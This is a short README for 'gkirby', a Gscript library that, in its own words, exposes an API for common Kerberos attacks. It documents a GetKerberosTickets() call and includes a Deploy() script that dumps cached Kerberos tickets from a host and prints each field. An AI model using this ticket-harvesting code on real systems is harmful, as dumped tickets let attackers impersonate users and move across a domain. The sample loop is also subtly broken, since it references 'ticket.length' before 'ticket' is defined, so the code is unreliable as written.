# Gscript Kerberos (gkirby)
> Gscript library to facilitate raw Kerberos interactions, similar to GhostPack's Rubeus.

## About

gkirby builds upon the groundwork laid out by Alex Levinson and Dan Borges by exposing a simple API to enable common Kerberos attacks such as dumping cached tickets (more to come).

## API Docs

- [gkirby](#gscript-kerberos-gkirby)
  - [About](#about)
  - [API Docs](#api-docs)
    - [Ticket Extraction and Harvesting](#ticket-extracting-and-harvesting)

### Ticket Extracting and Harvesting
`GetKerberosTickets()`:
returns a `[]map[string]interface{}` of Kerberos tickets, which is essentially just a HashMap that can be used from the JS frontend.
```
function Deploy() {
    var tickets = kerberos.GetKerberosTickets();
    if (tickets === null) {
        console.log("Failed to get tickets");
        return false;
    }
    
    for (var i=0; i < ticket.length; i++) {
        var ticket = tickets[i];
        for (var key in ticket) {
            console.log(key + ': ' + ticket[key]);
        }
    }
    
    return true;
}
```